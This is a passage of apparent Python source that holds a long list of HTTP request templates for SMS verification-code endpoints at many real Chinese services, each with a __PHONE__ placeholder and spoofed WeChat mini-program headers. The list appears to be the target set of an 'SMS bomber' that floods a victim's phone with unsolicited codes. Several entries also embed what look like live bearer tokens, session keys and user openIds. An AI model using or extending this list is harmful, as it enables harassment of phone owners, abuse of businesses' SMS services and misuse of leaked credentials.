            "xweb_xhr": "1",
            "user-agent": "__UA__",
            "content-type": "application/json",
            "accept": "*/*",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://servicewechat.com/wx0f888fdd708a94de/68/page-frame.html",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN,zh;q=0.9",
        },
        "data": {"mobile": "__PHONE__"},
    },
    {
        "name": "yakeyun.ddsp.go2click.cn",
        "method": "POST",
        "url": "https://yakeyun.ddsp.go2click.cn/mini/ortho/his/reg/smsApply",
        "headers": {
            "Host": "yakeyun.ddsp.go2click.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "appletcode": "mlk",
            "applethid": "",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "logintoken": "24338847b5e0b7f61973a007d7c35a68",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx7e0a5d8de86658d5/176/page-frame.html",
        },
        "data": "{\"phone\":\"__PHONE__\",\"clientCode\":\"yky2020\"}",
    },
    {
        "name": "ss.duya147.com",
        "method": "POST",
        "url": "https://ss.duya147.com/zba/api/sms",
        "headers": {
            "Host": "ss.duya147.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "__UA__",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ss.duya147.com",
            "X-Requested-With": "com.tencent.mobileqq",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ss.duya147.com/abz147/register",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        },
        "data": "{\"mobile\":\"__PHONE__\",\"flag\":1}",
    },
    {
        "name": "api.yahedso.com",
        "method": "POST",
        "url": "https://api.yahedso.com/notification/codes/login",
        "headers": {
            "Host": "api.yahedso.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "channel": "yahe-wechat-mini",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "sassappid": "0",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": (
                "eyJhbGciOiJIUzI1NiJ9.eyJsb2dpblRpbWUiOjE3NjU2MTMzMjA3MzAsImxvZ2luVHlwZSI6IldFQ0hBVCIsInVzZXJJZCI6MTk"
                "5OTc1MzMyNDA0MzE4MjA5MCwidXNlclNvdXJjZSI6IldFQ0hBVCJ9.eCKWy9UOKnLIj51wc-9oun8QhllP20lU9OT6z676inU"
            ),
            "Referer": "https://servicewechat.com/wx28364debdead316c/65/page-frame.html",
        },
        "data": "{\"recv\":\"__PHONE__\",\"verifyValue\":\"111111\"}",
    },
    {
        "name": "mp.dsssp.com",
        "method": "POST",
        "url": "https://mp.dsssp.com/aw_api/v1/login/apiLoginAwService/sendSmsRegisterVerifyCode",
        "headers": {
            "Host": "mp.dsssp.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "app-id": "wx10ad116a509bc468",
            "auth": "",
            "shop-id": "0",
            "sign": "338ED133CFFC3C0D330D6C3597B17FE1",
            "User-Agent": "__UA__",
            "open-id": "o1tuS5IFsqsYjnB_PQbMhuEjH3UQ",
            "union-id": "ozzMA65SxsPOwTcgv84bXktICFkk",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "v": "1.0.14.34",
            "content-type": "application/json",
            "project-id": "2010156361",
            "store-puid": "82705",
            "ts": "__TIMESTAMP__",
            "Referer": "https://servicewechat.com/wx10ad116a509bc468/53/page-frame.html",
        },
        "data": "{\"mobile\":\"__PHONE__\",\"areaCode\":\"\"}",
    },
    {
        "name": "m.aldi.com.cn",
        "method": "POST",
        "url": "https://m.aldi.com.cn/ouser-web/mobileRegister/sendCaptchasCodeForm.do",
        "headers": {
            "Host": "m.aldi.com.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "p-system": "weChat",
            "User-Agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded;text/html;charset=utf-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "cryptoversion": "621ed7c3d760780a3078f14f",
            "p-releasecode": "",
            "Referer": "https://servicewechat.com/wxcc73ef38a41c951a/373/page-frame.html",
        },
        "data": "mobile=__PHONE__&captchasType=3",
        "cookies": {"locale": "zh_CN", "ut": ""},
    },
    {
        "name": "ycfwcx.com:12399",
        "method": "GET",
        "url": "https://www.ycfwcx.com:12399/GetVcodeAction.do?act=reg&mobilePhone=__PHONE__",
        "headers": {
            "Host": "www.ycfwcx.com:12399",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "text/xml;charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx614f5d6294b6da99/41/page-frame.html",
        },
    },
    {
        "name": "concare.cn",
        "method": "POST",
        "url": "https://www.concare.cn/concare/tms/external/sendSms",
        "headers": {
            "Host": "www.concare.cn",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "operatoraccount": "",
            "destination": "192.168.201.129:8045",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "operatorname": "",
            "Referer": "https://servicewechat.com/wx37257d2a7be330e6/240/page-frame.html",
        },
        "data": "{\"phone\":\"__PHONE__\",\"type\":2}",
    },
    {
        "name": "fms.zmd.com.cn",
        "method": "GET",
        "url": "https://fms.zmd.com.cn/industry/api/applet/driver/getSmsRandomCode?phone=__PHONE__&loginType=1",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "proyiyunliapi.eyunli.com",
        "method": "GET",
        "url": "https://proyiyunliapi.eyunli.com/api/sms/login?phoneNumber=__PHONE__",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "scenter.gaojin.com.cn",
        "method": "POST",
        "url": "https://scenter.gaojin.com.cn/api/gateway/api/identity/v3/verify-code",
        "headers": {
            "Host": "scenter.gaojin.com.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "application-key": "6ad56a704a744a5980f7d8597be59378",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx8b03134380c41f67/27/page-frame.html",
        },
        "data": "{\"type\":1,\"target\":\"__PHONE__\",\"checkAccount\":true}",
    },
    {
        "name": "tonghang.smartebao.com",
        "method": "GET",
        "url": "https://tonghang.smartebao.com/oitTrade/applet/sms/sendLoginSms?phoneNo=__PHONE__",
        "headers": {
            "Host": "tonghang.smartebao.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "mobile-request": "true",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": "",
            "Referer": "https://servicewechat.com/wxcabd5caa3b36fe7d/82/page-frame.html",
        },
    },
    {
        "name": "e-zhijian.com",
        "method": "POST",
        "url": "https://www.e-zhijian.com/wlhy168/sys/sms",
        "headers": {
            "Host": "www.e-zhijian.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "x-access-token": "",
            "Referer": "https://servicewechat.com/wx0165148df5d6b027/18/page-frame.html",
        },
        "data": "{\"mobile\":\"__PHONE__\",\"smsmode\":1,\"randomNumber\":\"\",\"randomKey\":\"__PHONE__\"}",
    },
    {
        "name": "twebapi.chaojuntms.com",
        "method": "POST",
        "url": "https://twebapi.chaojuntms.com/BaseManage/Home/SmsSend",
        "headers": {
            "Host": "twebapi.chaojuntms.com",
            "Connection": "keep-alive",
            "authorization": (
                "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiJBZG1pbiIsIkV4cGlyZSI6IjIwMjAtMTItMDIgMgjv"
                "MzM6NTMuOTc5In0.q0p7t0UxzF8clSJudmSkwKO6fHzVCIae4EZ5cDnhYI0"
            ),
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxdcc8492fea52479c/23/page-frame.html",
        },
        "data": "{\"Moblie\":\"__PHONE__\",\"SmsCode\":\"\",\"OpenId\":\"\"}",
    },
    {
        "name": "api.cx.chinasinai.com",
        "method": "POST",
        "url": "https://api.cx.chinasinai.com/proxyapi/msg/sendMsg",
        "headers": {
            "Host": "api.cx.chinasinai.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": "",
            "Referer": "https://servicewechat.com/wx456af3c40ce2cb75/222/page-frame.html",
        },
        "data": "phone=__PHONE__",
    },
    {
        "name": "napi.tudgo.com",
        "method": "GET",
        "url": "https://napi.tudgo.com/logistics/driver/login/captcha?phone=__PHONE__",
        "headers": {
            "Host": "napi.tudgo.com",
            "Connection": "keep-alive",
            "authorization": "Bearer",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxdb81eba0fb33f8e1/24/page-frame.html",
        },
    },
    {
        "name": "gy.huajichen.com",
        "method": "GET",
        "url": "https://gy.huajichen.com/tms/app/sms/sendAliCode?phone=__PHONE__",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "api.ddduo.01tiaodong.cn",
        "method": "POST",
        "url": "https://api.ddduo.01tiaodong.cn/proxyapi/msg/sendMsg",
        "headers": {
            "Host": "api.ddduo.01tiaodong.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": "",
            "Referer": "https://servicewechat.com/wx1d8ec8640fe8200e/282/page-frame.html",
        },
        "data": "phone=__PHONE__",
    },
    {
        "name": "prod.java.56etms.com",
        "method": "POST",
        "url": "https://prod.java.56etms.com/xq-route-plan-tms/user/sendSmsCodeNoCheck",
        "headers": {
            "Host": "prod.java.56etms.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "customer-type": "beta",
            "User-Agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx2323bae3a815876d/125/page-frame.html",
        },
        "data": "phone=__PHONE__",
    },
    {
        "name": "yiliuyunshu.cn",
        "method": "POST",
        "url": "https://yiliuyunshu.cn/wlhyapi/getSmsCode",
        "headers": {
            "Host": "yiliuyunshu.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "product": "app-wlhy-vhc",
            "ip": "111.38.169.240",
            "User-Agent": "__UA__",
            "imei": "ss-6149fa64-2902-4d25-b3f9-842ce6cae146",
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "osversion": "wechart-V2403A",
            "Referer": "https://servicewechat.com/wxff5f8ee7ca544929/15/page-frame.html",
        },
        "data": "mobile=__PHONE__&productKey=weapp-wlhy-vhc&session3rd=d6d813d7-e3a4-4052-acd5-3d79bb791350",
        "cookies": {"SHAREJSESSIONID": "ss-6149fa64-2902-4d25-b3f9-842ce6cae146"},
    },
    {
        "name": "a.8m18.com",
        "method": "POST",
        "url": "https://a.8m18.com/api/driver/login/verification_code",
        "headers": {
            "Host": "a.8m18.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "location": "",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "tocker": "",
            "Referer": "https://servicewechat.com/wx2748049892e9eb92/23/page-frame.html",
        },
        "data": "{\"tel\":\"__PHONE__\",\"pass\":\"\",\"code\":\"\"}",
    },
    {
        "name": "weishop02.huanong1688.com",
        "method": "POST",
        "url": "https://weishop02.huanong1688.com/shop/s/guest/sendRegAuthCode",
        "headers": {
            "Host": "weishop02.huanong1688.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "sec-ch-ua-mobile": "?1",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "__UA__",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "token": "",
            "Origin": "https://weishop02.huanong1688.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://weishop02.huanong1688.com/uk1635580563500826624/register/index",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        },
        "data": "mobile=__PHONE__&businessType=1000&tenantId=uk1635580563500826624&lang=zh_CN",
        "cookies": {"HNST_SHOP_USER_INFO_uk1635580563500826624": ""},
    },
    {
        "name": "admin.wumazhnmg.com",
        "method": "GET",
        "url": "https://admin.wumazhnmg.com/zmd-service-base/other/getSmsCode?mobile=__PHONE__",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "sh.leakeyun.com",
        "method": "POST",
        "url": "https://sh.leakeyun.com/weapp/base/sendvalidate",
        "headers": {
            "Host": "sh.leakeyun.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "company": "sxthf_TH2024",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx31a84ba4f865c5ca/5/page-frame.html",
        },
        "data": "{\"phone\":\"__PHONE__\"}",
    },
    {
        "name": "member-purchase.hbxinfadi.com",
        "method": "POST",
        "url": "https://member-purchase.hbxinfadi.com/api/open/member/sms",
        "headers": {
            "Host": "member-purchase.hbxinfadi.com",
            "Connection": "keep-alive",
            "authorization": "111",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "app-version": "2.2.4",
            "Referer": "https://servicewechat.com/wx5e1817bd2ac2f220/204/page-frame.html",
        },
        "data": (
            "{\"mobile\":\"__PHONE__\",\"tdc_id\":81,\"PhoneDeviceInfo\":{\"brand\":\"apple\",\"deviceBrand\":\"apple\","
            "\"deviceId\":\"17656331022864097366\",\"deviceModel\":\"V2404A\",\"deviceOrientation\":\"portrait\","
            "\"devicePixelRatio\":3.5,\"model\":\"V2404A\",\"system\":\"Android 14\",\"networkType\":\"wifi\","
            "\"isConnected\":true}}"
        ),
    },
    {
        "name": "v8mp.600vip.cn",
        "method": "POST",
        "url": "https://v8mp.600vip.cn/api/GeneralInterface/SendValidationCode",
        "headers": {
            "Host": "v8mp.600vip.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "mp_api_shopid": "",
            "content-type": "application/json",
            "mp_api_compcode": "18679393949",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx165676254d5f5c01/1/page-frame.html",
        },
        "data": "{\"Mobile\":\"__PHONE__\"}",
    },
    {
        "name": "uc.17win.com",
        "method": "GET",
        "url": (
            "https://uc.17win.com/sms/v4/web/verificationCode/send?mobile=__PHONE__&scene=bind&isVoice=N&"
            "appId=70774617641171202208031508899"
        ),
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "mcpwxp.motherchildren.com",
        "method": "POST",
        "url": "https://mcpwxp.motherchildren.com/cloud/ppclient/msg/getauthcode",
        "headers": {
            "Host": "mcpwxp.motherchildren.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx38285c6799dac2d1/284/page-frame.html",
        },
        "data": (
            "{\"organCode\":\"HXD2\",\"appCode\":\"HXFYAPP\",\"channelCode\":\"PATIENT_WECHAT_APPLET\",\"phoneNum\":\"__PHONE__\","
            "\"busiCode\":\"hyt_account\",\"tempCode\":\"normal\",\"clientId\":\"ooo9znbykh\",\"needCheck\":false}"
        ),
    },
    {
        "name": "xcx.padtf.com",
        "method": "GET",
        "url": (
            "https://xcx.padtf.com/xcxapi/appuser.php?rec=getsjyzm&phone=__PHONE__&msgtype=4&"
            "session_key=33839c2290cc900dab00e8b39cbda6bd"
        ),
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "yida178.cn",
        "method": "PUT",
        "url": "https://www.yida178.cn/prod-api/sendRegisterCode/__PHONE__",
        "headers": {
            "Host": "www.yida178.cn",
            "Connection": "keep-alive",
            "authorization": "Bearer undefined",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "content-language": "zh_CN",
            "Referer": "https://servicewechat.com/wxba8e24dcc66715a4/56/page-frame.html",
        },
    },
    {
        "name": "dxylbzj.com",
        "method": "POST",
        "url": "https://www.dxylbzj.com/api/app/sms/code",
        "headers": {
            "Host": "www.dxylbzj.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json;charset=utf-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxa1d158d450bd2f57/9/page-frame.html",
        },
        "data": "{\"phone\":\"__PHONE__\"}",
    },
    {
        "name": "cx-hmb.zkydib.com",
        "method": "POST",
        "url": "https://cx-hmb.zkydib.com/hmb-js26/api/v1/user/register/sms",
        "headers": {
            "Host": "cx-hmb.zkydib.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "X-PI-PRO-NUM": "CITY00000022",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": "__UA__",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "projectId": "PJ000059",
            "Origin": "https://cx-hmb.zkydib.com",
            "X-Requested-With": "com.tencent.mobileqq",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://cx-hmb.zkydib.com/js26/?t=1765684968808",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        },
        "data": "{\"phoneNo\":\"__PHONE__\"}",
        "cookies": {"_hmb_cx_sid_js26": "\"js26:wx882ece121b851496:ozRDP6ZsYbD7YPBZAWo19VNkVXmQ\""},
    },
    {
        "name": "api.hamptonhotels.com.cn",
        "method": "POST",
        "url": "https://api.hamptonhotels.com.cn/api/User/SendMobileCode",
        "headers": {
            "Host": "api.hamptonhotels.com.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "x-auth-header": (
                "a0eemh+SwGEvHHT77TqR0ty9yqUPqYQjeY0wg4TJgOkFjF1ni3mjHxX2Z3dnKlKX9wJ3XViyZlpG423AnsOi/agDcnMElZbdIXqm"
                "KVemSQc7119hAzk1pmIoxuyyctlOugOAGN8Ii9ReUGPYTxQh8lTE7aBv2XV5q/ar/E0uFjetT1Y8IMbRWmw/WCp7x/Ad|1|"
                "__TIMESTAMP__"
            ),
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxb9a76c5f2625cfc9/231/page-frame.html",
        },
        "data": "{\"reqid\":35,\"mobile\":\"__PHONE__\",\"no_valid_code\":true}",
    },
    {
        "name": "w.argylehotels.com",
        "method": "GET",
        "url": "https://w.argylehotels.com/hsgroup/api/sms-vcode?phoneNo=__PHONE__&orgId=001",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "public.hikparking.com",
        "method": "POST",
        "url": "https://public.hikparking.com/api/driver/v2/api/sendVerifyCode",
        "headers": {
            "Host": "public.hikparking.com",
            "Connection": "keep-alive",
            "authorization": "",
            "clienttype": "8",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx1db9f853c02f4bd7/60/page-frame.html",
        },
        "data": "{\"phone\":\"__PHONE__\",\"type\":1,\"random\":67,\"sign\":\"21bf8482004d5291ff0c5d04f49561c5\"}",
    },
    {
        "name": "xtzhtc.cn",
        "method": "GET",
        "url": "https://xtzhtc.cn/acct_security/code/sms?mobile=__PHONE__",
        "headers": {
            "Host": "xtzhtc.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "deviceid": "1765704685811908070",
            "Referer": "https://servicewechat.com/wx7f4189124b248255/50/page-frame.html",
        },
    },
    {
        "name": "dlmixc-parking.lncrland.cn",
        "method": "POST",
        "url": "https://dlmixc-parking.lncrland.cn/syhgwxh-api/1.0/default/send-msg",
        "headers": {
            "Host": "dlmixc-parking.lncrland.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx61c81e0c74e1c278/13/page-frame.html",
        },
        "data": "{\"phone\":\"__PHONE__\",\"tempType\":\"ZL\",\"channel\":\"MINI\",\"length\":4}",
    },
    {
        "name": "tsms1.sctfia.com",
        "method": "GET",
        "url": "https://tsms1.sctfia.com/captcha_send?phone=__PHONE__",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "php.51jjcx.com",
        "method": "POST",
        "url": "https://php.51jjcx.com/user/Login/sendSMStttt_123",
        "headers": {
            "Host": "php.51jjcx.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json, text/plain, */*",
            "Referer": "https://servicewechat.com/wxfaa1ea1ef2c2be3f/231/page-frame.html",
        },
        "data": (
            "phone=__PHONE__&sign=vepMXAyON4Y2iUmCU8kBK00Wp4jnyWK6WSVlCR86oDLEOYyIM0Z%2FqSwWpTG1hxGB7LVvA8OLZqG9F"
            "FOaku2X33spidhBYWG%2B8iwX9%2BottphviMiG2JL%2By6zta3bxGrgYOGu8Nmii6VfiVyoU1clid3F7CLodljKhuuY1IVEbOFx"
            "SZ16C%2Fcag%2FOy4UUUlzXvsSwFv4K5%2FFLX5QV3GKhtxqF6aEcUqLJquJPDUNq%2GOZZuaRnb%2B%2Bz9wtJvTk%2BHKnDbIU"
            "mNuolvqFTOM%2BV7WS0AvUsSCVgKhHoQsUf7Lz2j0kr1PC1X78mPEn82nz8%2BAl6%2FAFSNHDeoknBTzpnNgmrm5OQ%3D%3D"
        ),
    },
    {
        "name": "skyclient.shangshuikeji.cn",
        "method": "POST",
        "url": "https://skyclient.shangshuikeji.cn/h5/v1/passenger/user/wx/sendVerifyCode",
        "headers": {
            "Host": "skyclient.shangshuikeji.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json;charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "_yy_cid": "100001",
            "Referer": "https://servicewechat.com/wx0f7efcce0dffa575/300/page-frame.html",
        },
        "data": (
            "{\"channelId\":\"100001\",\"sdk\":\"3.8.12\",\"deviceModel\":\"V2403A\",\"appversion\":\"release/feat_20251204\","
            "\"pf\":2,\"channel\":\"wechat_applet\",\"openId\":\"o-Fd45UsgFym5ruBA3kcGn_-Hd6c\","
            "\"commonParams\":\"{\\\"sdk\\\":\\\"3.8.12\\\",\\\"deviceModel\\\":\\\"V2403A\\\","
            "\\\"appversion\\\":\\\"release/feat_20251204\\\",\\\"pf\\\":2,\\\"channel\\\":\\\"wechat_applet\\\","
            "\\\"openId\\\":\\\"o-Fd45UsgFym5ruBA3kcGn_-Hd6c\\\"}\",\"mobile\":\"__PHONE__\"}"
        ),
    },
    {
        "name": "mini.shangyubike.com",
        "method": "GET",
        "url": "https://mini.shangyubike.com/USER-SERVICE/sms/sendValidCode?mobileNo=__PHONE__&reqType=Regist",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "appdl.zzcyjt.com:60044",
        "method": "POST",
        "url": "https://appdl.zzcyjt.com:60044/api/person/getLoginCode",
        "headers": {
            "Host": "appdl.zzcyjt.com:60044",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxba28c1653b77e510/215/page-frame.html",
        },
        "data": "{\"phoneNumber\":\"__PHONE__\"}",
    },
    {
        "name": "load.dingdatech.com",
        "method": "POST",
        "url": "https://load.dingdatech.com/api/uum/security/getVcode",
        "headers": {
            "Host": "load.dingdatech.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxf7c61a26a092859c/60/page-frame.html",
        },
        "data": "{\"appId\":\"mtacf84f3423b0e6132\",\"phoneNO\":\"__PHONE__\"}",
    },
    {
        "name": "xtjfcd.com",
        "method": "POST",
        "url": "https://www.xtjfcd.com/api/api-service/api/getCode",
        "headers": {
            "Host": "www.xtjfcd.com",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx9fb2b19202fa5717/38/page-frame.html",
        },
        "data": "{\"phoneNo\":\"__PHONE__\",\"sellerNo\":\"xt\",\"type\":\"3\"}",
    },
    {
        "name": "erp.fjtantu.cn",
        "method": "GET",
        "url": "https://erp.fjtantu.cn/api/sys/getSmsCode?phone=__PHONE__",
        "headers": {
            "Host": "erp.fjtantu.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json;charset=utf-8",
            "source": "7",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "cache-control": "no-cache",
            "accept-charset": "utf-8",
            "x-access-token": "",
            "Referer": "https://servicewechat.com/wx120464bb36389b2b/25/page-frame.html",
        },
    },
    {
        "name": "api.yccsparking.com",
        "method": "POST",
        "url": "https://api.yccsparking.com/yccstc-service-api/account/getPin",
        "headers": {
            "Host": "api.yccsparking.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json",
            "Referer": "https://servicewechat.com/wx8c0f477b635e9b93/87/page-frame.html",
        },
        "data": (
            "{\"mobilenum\":\"__PHONE__\",\"pinlength\":6,\"verify_key\":\"\",\"verify_code\":\"\",\"from\":\"3\",\"utoken\":\"\"}"
        ),
    },
    {
        "name": "kyxtpt.com",
        "method": "POST",
        "url": "https://www.kyxtpt.com/auth/api/v1/login/sms-valid-code-send",
        "headers": {
            "Host": "www.kyxtpt.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "6zubypya": "[object Undefined]",
            "devicetype": "WECHAT",
            "accept": "application/json",
            "Referer": "https://servicewechat.com/wx73fb48c3856b005d/39/page-frame.html",
        },
        "data": "{\"loginId\":\"__PHONE__\"}",
    },
    {
        "name": "xxdz.maiziedu.cn",
        "method": "POST",
        "url": "https://xxdz.maiziedu.cn/api/v2/sms/sendRegCode",
        "headers": {
            "Host": "xxdz.maiziedu.cn",
            "Connection": "keep-alive",
            "authorization": "Bearer",
            "charset": "utf-8",
            "x-app-platform": "mp-weixin",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "x-app-version": "2.0.16",
            "Referer": "https://servicewechat.com/wx7c2d51b59c4fc80c/164/page-frame.html",
        },
        "data": "{\"mobile\":\"__PHONE__\"}",
    },
    {
        "name": "tjcx-server.crcctjyy.cn",
        "method": "POST",
        "url": "https://tjcx-server.crcctjyy.cn/his/smsVerification/sendVerification",
        "headers": {
            "Host": "tjcx-server.crcctjyy.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx7631fd8e4006598c/2/page-frame.html",
        },
        "data": "{\"phoneNumber\":\"__PHONE__\"}",
    },
    {
        "name": "qcty.crscl.com.cn",
        "method": "POST",
        "url": "https://qcty.crscl.com.cn/crscl-wlgl-app-api/crscl-wlgl-user/cust/custSendAuthCodeRegister",
